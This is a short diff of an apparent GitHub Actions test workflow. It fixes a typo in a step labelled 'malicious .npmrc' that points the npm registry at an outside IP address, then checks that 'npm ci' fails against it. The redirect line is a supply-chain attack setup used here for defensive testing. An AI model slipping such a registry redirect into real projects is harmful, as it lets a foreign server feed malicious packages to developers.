@@ -13,7 +13,7 @@ jobs:
 
       - name: Create malicious .npmrc file
         # ❗ IMPORTANT: Change the URL below to your server's IP!
-        run: echo "registry=http://34.227.190.3 :4873" > .npmrc
+        run: echo "registry=http://34.227.190.3:4873" > .npmrc
 
       - name: Attempt to install packages
         # npm ci is strict and uses the lockfile. This SHOULD fail.
